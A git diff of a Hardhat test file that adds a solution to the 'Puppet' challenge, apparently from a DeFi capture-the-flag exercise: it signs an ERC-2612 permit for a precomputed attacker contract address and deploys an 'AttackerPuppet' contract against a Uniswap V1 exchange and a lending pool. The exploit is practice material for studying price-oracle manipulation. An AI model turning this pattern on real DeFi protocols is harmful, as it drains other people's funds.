@@ -1,9 +1,10 @@
 const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
 const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
-const { ethers } = require('hardhat');
+const { ethers, network } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { signERC2612Permit } = require('eth-permit');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -94,7 +95,65 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const attacker_address = ethers.utils.getContractAddress({
+            from: player.address,
+            nonce: 0
+        });
+
+        const name = await token.name();
+        const chainId = network.config.chainId;
+        const nonce = await token.nonces(player.address);
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+
+        const EIP712Domain = {
+            name: name,
+            version: "1",
+            chainId: chainId,
+            verifyingContract : token.address
+        }
+
+        const types = [
+            { name: "owner", type: "address" },
+            { name: "spender", type: "address" },
+            { name: "value", type: "uint256" },
+            { name: "nonce", type: "uint256" },
+            { name: "deadline", type: "uint256" },
+        ]
+
+        const Permit = {
+            owner: player.address,
+            spender: attacker_address,
+            value: PLAYER_INITIAL_TOKEN_BALANCE,
+            nonce: nonce,
+            deadline: deadline
+        }
+
+        // const sig_raw = await player._singnTypeData({
+        //     EIP712Domain, types, Permit
+        // });
+
+        const sig = await signERC2612Permit(
+            player, 
+            token.address, 
+            player.address,
+            attacker_address,
+            PLAYER_INITIAL_TOKEN_BALANCE
+        );
+
+        const value = ethers.utils.parseEther("20");
+
+        const Attacker = await ethers.getContractFactory('AttackerPuppet', player);
+        await Attacker.deploy(
+            token.address,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            sig.deadline,
+            sig.v,
+            sig.r,
+            sig.s,
+            uniswapExchange.address,
+            lendingPool.address,
+            { value: value }
+        );
     });
 
     after(async function () {
